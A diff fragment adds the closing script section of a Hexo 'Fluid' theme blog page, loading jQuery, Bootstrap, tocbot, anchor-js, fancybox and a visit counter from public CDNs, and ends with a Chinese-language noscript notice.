+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
